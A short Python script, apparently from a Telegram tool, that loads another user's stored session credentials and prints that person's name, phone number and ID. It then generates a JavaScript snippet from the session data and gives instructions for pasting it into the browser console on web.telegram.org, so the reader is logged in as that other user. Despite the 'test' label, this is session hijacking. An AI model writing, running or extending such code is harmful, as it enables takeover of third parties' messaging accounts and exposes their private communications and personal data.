#!/usr/bin/env python3
"""
Test the other user's session
"""

from utils.credentials_manager import credentials_manager

def test_other_session():
    """Test the other user's session"""
    
    # Load the other user's credentials
    filename = "credentials_7847625846_1752443502.json"
    credentials = credentials_manager.load_credentials(filename)
    
    if not credentials or 'session_data' not in credentials:
        print(f"❌ No valid session data found in {filename}")
        return None
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Testing other user's session")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"🆔 User ID: {user_info.get('id', 'Unknown')}")
    print(f"🔑 Auth Type: REAL")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate the working format script
    script_content = credentials_manager.generate_working_format_script(session_data)
    
    # Save the script
    timestamp = "test_other_user"
    user_id = user_info.get('id', 'unknown')
    script_filename = f"test_other_session_{user_id}_{timestamp}.js"
    script_filepath = f"credentials/{script_filename}"
    
    with open(script_filepath, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    print(f"✅ Test script generated: {script_filename}")
    print(f"📁 Saved to: {script_filepath}")
    print(f"📏 Script length: {len(script_content)} characters")
    print("=" * 60)
    print("🎉 Test script ready!")
    print("📝 Instructions:")
    print("1. Copy the script from the generated file")
    print("2. Open https://web.telegram.org/a/ in your browser")
    print("3. Press F12 → Console tab")
    print("4. Paste and press Enter")
    
    return script_filepath

if __name__ == "__main__":
    test_other_session() 